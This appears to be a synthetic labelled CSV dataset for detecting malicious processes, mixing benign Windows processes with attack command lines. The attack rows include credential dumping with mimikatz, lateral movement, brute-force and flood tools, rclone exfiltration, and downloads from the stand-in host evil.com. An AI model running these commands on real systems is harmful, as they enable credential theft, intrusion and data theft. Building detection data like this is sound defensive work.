process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
SearchIndexer.exe,SearchIndexer.exe,51.71301622990023,2.672930619280332,0,17,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe lsadump::sam,35.63752027294459,15.142487447152327,1,5,0,credential_dumping,mitre_credential_dumping,critical
WUDFHost.exe,WUDFHost.exe,10.092731475337601,5.268632910688277,0,9,0,normal,synthetic_normal,
psexec.exe,psexec.exe \\target -s cmd.exe,78.68522895728276,10.257344513373035,1,8,0,lateral_movement,mitre_lateral_movement,high
OBS64.exe,OBS64.exe,29.97482440670064,2.0211866246298005,1,1,0,normal,synthetic_normal,
Discord.exe,Discord.exe,11.150066940501857,2.464638540089848,1,1,0,normal,synthetic_normal,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,89.08602378691118,8.270996337637808,1,116,0,brute_force,brute_force_tools,
firefox_update.exe,firefox_update.exe --silent,58.485418996923954,13.10740917349538,1,13,0,malware,known_malware,
python3.12.exe,python3.12.exe,17.006376973253953,6.91940079227995,0,12,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,65.73079262340488,14.70979724418542,1,100,0,brute_force,brute_force_tools,
dllhost.exe,dllhost.exe,20.12043905970112,2.63943205151782,0,1,0,normal,synthetic_normal,
com.docker.backend.exe,com.docker.backend.exe,10.421058513831959,3.2351249345511537,0,4,0,normal,synthetic_normal,
javaws.exe,javaws.exe,17.23408851042498,0.6757863012209107,1,17,0,normal,synthetic_normal,
cgminer.exe,cgminer.exe --silent,83.14432396591556,26.52201284203862,1,20,0,ddos,known_malware,
git-credential-manager.exe,git-credential-manager.exe,0.12394032232309615,2.4281270333241474,0,1,0,normal,synthetic_normal,
Code.exe,Code.exe,17.122182492861562,7.329411343633759,0,15,0,normal,synthetic_normal,
MsSense.exe,MsSense.exe,1.9684227166188417,2.894159248418176,1,16,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe lsadump::sam,35.96413379171963,8.753474695463337,0,3,0,credential_dumping,mitre_credential_dumping,critical
Skype.exe,Skype.exe,29.286309405586234,1.2213438438253936,1,4,0,normal,synthetic_normal,
EXCEL.EXE,EXCEL.EXE,0.5839782761089696,2.469926058346597,0,2,0,normal,synthetic_normal,
rar.exe,rar.exe a -hp archive.rar C:\Data,46.09210620519299,20.007198104051934,1,8,0,data_exfiltration,mitre_data_exfiltration,medium
ssh.exe,ssh.exe,18.317594761107966,7.099075570902709,0,10,0,normal,synthetic_normal,
gpg-agent.exe,gpg-agent.exe,22.71686261669462,5.284364741783114,1,7,0,normal,synthetic_normal,
ssh.exe,ssh.exe,17.772399787135743,4.127854606813479,0,15,0,normal,synthetic_normal,
Skype.exe,Skype.exe,22.076924191529727,7.773263883739454,1,11,0,normal,synthetic_normal,
mysqld.exe,mysqld.exe,14.157644182900448,7.331833256659392,0,10,0,normal,synthetic_normal,
Invoke-WebRequest,powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe,54.850490045543616,9.249970898565422,0,10,0,malware,mitre_download_execute,medium
rollup.exe,rollup.exe,5.78646607179082,5.728002394899573,0,7,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,99.2211952960022,27.056508343798345,1,1855,0,ddos,ddos_tools,
safari.exe,safari.exe,13.997424140920277,3.1257524814493958,0,15,0,normal,synthetic_normal,
powershell.exe,powershell.exe -ep bypass -file malware.ps1,78.46869425538489,14.883543810310915,0,6,0,malware,mitre_malicious_scripts,high
explore.exe,explore.exe --silent,53.76371113891558,16.960584235727197,1,10,0,trojan,known_malware,
code.exe,code.exe,28.516133709254632,3.984062538400061,1,20,0,normal,synthetic_normal,
idea64.exe,idea64.exe,26.245879261773506,3.65442940464942,0,17,0,normal,synthetic_normal,
npx.exe,npx.exe,18.732451034092115,7.902763140302017,0,8,0,normal,synthetic_normal,
winlogin.exe,winlogin.exe --silent,37.62420454623473,21.775498422476932,1,1,0,trojan,known_malware,
lync.exe,lync.exe,12.911241518811703,5.1030636191375125,0,5,0,normal,synthetic_normal,
svchost.exe,svchost.exe,28.42367151637569,4.82565086374871,0,1,1,normal,synthetic_normal,
mysqld.exe,mysqld.exe,20.45864871702034,1.6736857156829945,0,20,0,normal,synthetic_normal,
remcos.exe,remcos.exe --silent,32.42213166439285,17.901414296792293,1,3,0,malware,known_malware,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,63.40203583633295,13.588697041841264,1,409,0,brute_force,brute_force_tools,
go.exe,go.exe,1.7259382867999062,1.3714134619211826,0,4,0,normal,synthetic_normal,
nc64.exe,nc64.exe -lvp 4444,58.848174019036215,13.252614303938145,1,9,0,trojan,mitre_command_control,high
Signal.exe,Signal.exe,20.319849791356123,3.160409826007875,0,10,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,86.17289524166247,13.169392935073601,1,254,0,brute_force,brute_force_tools,
WindowsTerminal.exe,WindowsTerminal.exe,3.150209330745853,5.2407624529688865,0,15,0,normal,synthetic_normal,
idea64.exe,idea64.exe,9.175118692304114,6.67433986157373,0,17,0,normal,synthetic_normal,
revil.exe,revil.exe --silent,93.21996466913339,35.48831657383236,1,29,0,ransomware,known_malware,
mongod.exe,mongod.exe,5.078981606276429,5.439283016252846,0,13,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,21.8102699203983,1.394243576833063,0,6,0,normal,synthetic_normal,
System Idle Process,System Idle Process,94.15310858002393,0.18375831391454633,0,2,1,normal,synthetic_normal,
atexec.py,python atexec.py user:pass@target,29.338453547371504,17.475581959252054,1,5,0,lateral_movement,mitre_lateral_movement,high
icedid.exe,icedid.exe --silent,38.69571290418462,39.687854024949715,1,18,0,malware,known_malware,
dockerd.exe,dockerd.exe,25.899658790577895,3.242179992478333,0,2,0,normal,synthetic_normal,
Dropbox.exe,Dropbox.exe,7.253742986490988,5.55083287108335,0,17,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,30.29999982913742,19.03528022451338,1,1,0,data_exfiltration,mitre_data_exfiltration,high
System Idle Process,System Idle Process,94.69465550945554,0.9849740655189613,0,6,1,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,74.68163652673923,19.028292254826212,0,6,0,credential_dumping,mitre_credential_dumping,critical
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,65.09753775850349,15.675780310308763,1,230,0,brute_force,brute_force_tools,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",68.05464002463346,16.975308311778573,1,435,0,brute_force,brute_force_tools,
hping3.exe,hping3.exe --flood -p 80 target.com,92.95625127728901,34.427861290359736,1,1387,0,ddos,ddos_tools,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",59.90887070044063,18.797226353350823,1,322,0,brute_force,brute_force_tools,
procexp64.exe,procexp64.exe,15.103024977055869,6.284044864041837,0,13,0,normal,synthetic_normal,
OneDrive.exe,OneDrive.exe,29.526157657897315,7.338459514638595,0,9,0,normal,synthetic_normal,
TrustedInstaller.exe,TrustedInstaller.exe,22.510434550767567,6.581333206484335,0,13,0,normal,synthetic_normal,
git-credential-manager.exe,git-credential-manager.exe,19.010472644591108,5.399922946391686,0,18,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,8.670420321994321,4.89331828902642,0,10,0,normal,synthetic_normal,
Invoke-WebRequest,powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe,21.687073089699688,16.514879415121463,0,2,0,malware,mitre_download_execute,medium
Teams.exe,Teams.exe,2.876578098646856,2.790245309939312,0,9,0,normal,synthetic_normal,
msedge.exe,msedge.exe,10.377834759314839,12.857314734386431,0,0,0,normal,synthetic_normal,
Code.exe,Code.exe,15.08103064843326,4.4560944045432,0,10,0,normal,synthetic_normal,
procexp.exe,procexp.exe,7.198132111556454,6.8562324651364674,0,7,0,normal,synthetic_normal,
masscan.exe,masscan.exe -p1-65535 192.168.1.0/24,52.525114486403375,16.312852548922514,1,17,0,reconnaissance,mitre_network_scanning,medium
sqlservr.exe,sqlservr.exe,28.424024994563318,1.7942638537764808,0,1,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,81.60468673222803,17.354520900904625,1,335,0,ddos,ddos_tools,
mshta.exe,mshta.exe vbscript:Execute,51.32631532566725,15.995593037522333,0,0,0,malware,mitre_malicious_scripts,high
mpc-hc64.exe,mpc-hc64.exe,12.022395426460188,6.0090248206517805,0,2,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,98.11085226566945,9.662237218507801,1,310,0,brute_force,brute_force_tools,
dllhost.exe,dllhost.exe,22.065997958172858,6.744870815935168,0,9,0,normal,synthetic_normal,
cmd.exe,cmd.exe,10.958459873737109,4.148054923187642,0,13,0,normal,synthetic_normal,
zsh.exe,zsh.exe,10.955283005358627,6.519450845732239,0,15,0,normal,synthetic_normal,
conhost.exe,conhost.exe,29.931723384907734,5.650758943218768,0,13,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,6.081542920392327,5.380445604465696,0,12,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,24.77034675257237,5.164953021784423,1,15,0,normal,synthetic_normal,
Invoke-WebRequest,powershell.exe Invoke-WebRequest -Uri http://evil.com -OutFile mal.exe,73.6778651153376,21.721611983172366,1,2,0,malware,mitre_download_execute,medium
mysql.exe,mysql.exe,18.44129299438387,4.231182385784341,1,5,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,2.335932439406073,5.401307607874957,0,2,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,84.75752115317087,21.194507145653553,1,1000,0,ddos,ddos_tools,
services.exe,services.exe,23.414545770177423,7.3122211854265045,1,18,0,normal,synthetic_normal,
lsass32.exe,lsass32.exe --silent,73.49675246787402,23.709668801716493,1,16,0,trojan,known_malware,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,78.34042576759055,6.400694316038475,1,185,0,brute_force,brute_force_tools,
tsc.exe,tsc.exe,6.697585914440451,4.437799030675153,0,17,0,normal,synthetic_normal,
dwm.exe,dwm.exe,7.97897385807441,7.189744347424097,1,14,0,normal,synthetic_normal,
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,71.40678920712034,15.179947718528542,1,1,0,data_exfiltration,mitre_data_exfiltration,critical
lync.exe,lync.exe,14.930198691327442,5.975108487736108,1,3,0,normal,synthetic_normal,
winlogin.exe,winlogin.exe --silent,42.0458977326958,25.996312726422705,1,15,0,trojan,known_malware,
loic.exe,loic.exe --target 192.168.1.1 --port 80,97.74560843372439,14.852418018979446,1,1614,0,ddos,ddos_tools,
System Idle Process,System Idle Process,83.74174871408572,0.4709431345741133,0,10,1,normal,synthetic_normal,
dwm.exe,dwm.exe,28.329985653787556,0.975130129052084,0,19,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,22.65367570043397,2.888453752898133,0,13,0,normal,synthetic_normal,
webstorm64.exe,webstorm64.exe,7.941896745462831,1.384163718199305,0,16,0,normal,synthetic_normal,
System Idle Process,System Idle Process,87.88980315121579,0.6571844028927167,0,0,1,normal,synthetic_normal,
msiexec.exe,msiexec.exe,22.4096654219509,5.11072193649193,0,5,0,normal,synthetic_normal,
go.exe,go.exe,10.036484722342118,4.524684038211924,0,2,0,normal,synthetic_normal,
NisSrv.exe,NisSrv.exe,29.100136342962536,3.2681078803087393,1,6,0,normal,synthetic_normal,
vivaldi.exe,vivaldi.exe,12.470632023149555,6.851273555964591,0,19,0,normal,synthetic_normal,
postgres.exe,postgres.exe,12.516069591980319,1.4785365058237452,0,6,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,97.02087901829756,38.205870901308074,1,1293,0,ddos,ddos_tools,
rar.exe,rar.exe a -hp archive.rar C:\Data,27.553509212551866,8.308077847445954,1,4,0,data_exfiltration,mitre_data_exfiltration,medium
tcpview.exe,tcpview.exe,15.326127895077184,4.609156052168797,0,1,0,normal,synthetic_normal,
hping3.exe,hping3.exe --flood -p 80 target.com,91.67022473679768,19.872269737895788,1,119,0,ddos,ddos_tools,
wslservice.exe,wslservice.exe,0.6580149498294752,7.011676063512136,0,6,0,normal,synthetic_normal,
AfterFX.exe,AfterFX.exe,15.83398694270564,6.123987457219965,1,16,0,normal,synthetic_normal,
vlc.exe,vlc.exe,14.379115622368024,6.016838641679919,0,18,0,normal,synthetic_normal,
slowloris.py,python slowloris.py target.com,87.14463487196605,20.596864072941806,1,1737,0,ddos,ddos_tools,
Code.exe,Code.exe,3.0835963175376992,7.01048073761597,0,11,0,normal,synthetic_normal,
services.exe,services.exe,16.311539409957398,6.936243636901045,0,19,0,normal,synthetic_normal,
winpeas.exe,winpeas.exe,48.64276312832146,13.629214938801343,1,1,0,privilege_escalation,mitre_privilege_escalation,high
git-credential-manager.exe,git-credential-manager.exe,29.947182884153943,2.4186700644793366,0,18,0,normal,synthetic_normal,
SgrmBroker.exe,SgrmBroker.exe,16.140608719473562,1.7579371059687992,0,16,0,normal,synthetic_normal,
notepad++.exe,notepad++.exe,18.6199108720583,3.3568110411230303,0,9,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,19.341837190559712,0.9457619348535555,1,19,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",57.96907123277302,5.053956164040592,1,283,0,brute_force,brute_force_tools,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,35.55945050226302,15.422877279149876,0,2,0,malware,mitre_download_execute,high
MpCmdRun.exe,MpCmdRun.exe,23.123402770414963,5.540985712098951,1,14,0,normal,synthetic_normal,
chromium.exe,chromium.exe,21.015785810997006,5.428571790024267,0,11,0,normal,synthetic_normal,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,81.04589874864212,5.103594082531389,1,207,0,brute_force,brute_force_tools,
webstorm64.exe,webstorm64.exe,9.63784012362219,2.345226908136929,0,5,0,normal,synthetic_normal,
bloodhound.exe,bloodhound.exe -c All,30.801678021543957,24.65475404010721,1,9,0,reconnaissance,mitre_reconnaissance,critical
obs64.exe,obs64.exe,10.4471307173543,6.722808222820816,0,3,0,normal,synthetic_normal,
ShellExperienceHost.exe,ShellExperienceHost.exe,13.82685650555012,5.797990282407311,1,13,0,normal,synthetic_normal,
nmap.exe,nmap.exe -p- --min-rate 1000,67.3426041613132,6.328533569861596,1,36,0,reconnaissance,mitre_network_scanning,medium
cmake.exe,cmake.exe,17.272105938190958,1.1581343755031739,1,14,0,normal,synthetic_normal,
bfgminer.exe,bfgminer.exe --silent,88.41005835748169,33.82170856127384,1,23,0,ddos,known_malware,
Premiere.exe,Premiere.exe,12.272685871757979,4.699280220616602,0,1,0,normal,synthetic_normal,
npm.exe,npm.exe,22.468735483154525,6.217013164058303,0,17,0,normal,synthetic_normal,
rider64.exe,rider64.exe,8.738560654536997,5.273098000025425,0,17,0,normal,synthetic_normal,
encrypt.exe,encrypt.exe --recursive C:\Users,64.47494189142567,17.810318473555043,0,4,0,ransomware,mitre_ransomware,critical
mimikatz.exe,mimikatz.exe lsadump::dcsync,66.12047462757096,11.011871393142679,0,5,0,credential_dumping,mitre_credential_dumping,critical
ConEmuC.exe,ConEmuC.exe,22.932652955094234,5.2410513821079805,0,4,0,normal,synthetic_normal,
smbexec.py,python smbexec.py domain/user:pass@target,30.865851939318482,5.699373565101324,1,10,0,lateral_movement,mitre_lateral_movement,critical
SearchIndexer.exe,SearchIndexer.exe,79.45065436668479,2.5119765824055484,0,0,0,normal,synthetic_normal,
notepad.exe,notepad.exe,25.557948417778434,2.8820697192106213,1,11,0,normal,synthetic_normal,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,73.54790480407873,12.331558819415033,1,413,0,brute_force,brute_force_tools,
Code.exe,Code.exe,26.236367180801732,5.712362565110429,0,8,0,normal,synthetic_normal,
MpCmdRun.exe,MpCmdRun.exe,24.72305516873555,3.502192928658422,1,10,0,normal,synthetic_normal,
secretsdump.py,python secretsdump.py,41.83912449247308,10.26787160460753,0,0,0,credential_dumping,mitre_credential_dumping,critical
explorer.exe,explorer.exe,14.246950196634199,1.0049963228470955,0,8,0,normal,synthetic_normal,
chisel.exe,chisel.exe --silent,86.79352554778119,24.54033650247873,1,11,0,malware,known_malware,
ProcessHacker.exe,ProcessHacker.exe,22.39155485343346,6.2571452202258,0,19,0,normal,synthetic_normal,
nanocore.exe,nanocore.exe --silent,31.417458679847126,15.656623748970897,1,25,0,malware,known_malware,
cipher.exe,cipher.exe /w:C:,28.270861994148703,12.005089902998174,0,6,0,ransomware,mitre_ransomware,high
lazagne.exe,lazagne.exe all,54.92829302404583,18.19097657889517,1,1,0,credential_dumping,mitre_credential_dumping,high
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,47.749939280941156,12.408229303610955,1,219,0,brute_force,brute_force_tools,
SearchApp.exe,SearchApp.exe,17.01358423592435,3.341517974801525,1,13,0,normal,synthetic_normal,
SecurityHealthSystray.exe,SecurityHealthSystray.exe,26.05621874076184,1.8356420719224378,0,13,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,0.582240580493153,1.614575196796356,0,3,0,normal,synthetic_normal,
cmd.exe,cmd.exe,22.78793187184358,1.7453457161182258,0,15,0,normal,synthetic_normal,
encrypt.exe,encrypt.exe --recursive C:\Users,36.62421902917698,22.328209664070375,0,8,0,ransomware,mitre_ransomware,critical
firefox.exe,firefox.exe,50.20579706794056,10.034569866307068,0,2,0,normal,synthetic_normal,
pnpm.exe,pnpm.exe,13.942331212273197,6.688310294938162,1,20,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,82.62789786437511,17.80783178536722,1,227,0,brute_force,brute_force_tools,
SearchUI.exe,SearchUI.exe,11.666204318964285,3.2618017028706703,1,7,0,normal,synthetic_normal,
lsass.exe,lsass.exe,7.97202424191094,2.708347132012668,1,3,0,normal,synthetic_normal,
ShellExperienceHost.exe,ShellExperienceHost.exe,20.66867081193503,2.977966301225395,1,11,0,normal,synthetic_normal,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,49.85808603723029,18.625648152579046,1,336,0,brute_force,brute_force_tools,
ssh-add.exe,ssh-add.exe,21.329124820680484,1.9949113628112156,0,0,0,normal,synthetic_normal,
WhatsApp.exe,WhatsApp.exe,26.786640723626004,2.329536089558686,0,16,0,normal,synthetic_normal,
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,25.611423585390305,12.122119989135104,1,12,0,reconnaissance,mitre_network_scanning,medium
dasHost.exe,dasHost.exe,5.320618960416075,4.3787931541233505,0,14,0,normal,synthetic_normal,
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,89.25557470217049,7.280800827719322,1,485,0,brute_force,brute_force_tools,
git.exe,git.exe,8.840475488458846,6.693941334354169,0,16,0,normal,synthetic_normal,
egregor.exe,egregor.exe --silent,56.20529575575951,20.054793621689946,1,16,0,malware,known_malware,
stress.exe,stress.exe --cpu 8 --io 4,87.21788100559776,15.967564832257471,1,1565,0,ddos,ddos_tools,
sqlservr.exe,sqlservr.exe,17.335475615187274,2.5926465334939346,1,7,0,normal,synthetic_normal,
git.exe,git.exe,2.494733730925379,6.0258891807558745,0,17,0,normal,synthetic_normal,
MpCmdRun.exe,MpCmdRun.exe,13.836427076402904,5.4074970995747345,1,4,0,normal,synthetic_normal,
procexp64.exe,procexp64.exe,19.433093150402176,7.509461433114811,1,0,0,normal,synthetic_normal,
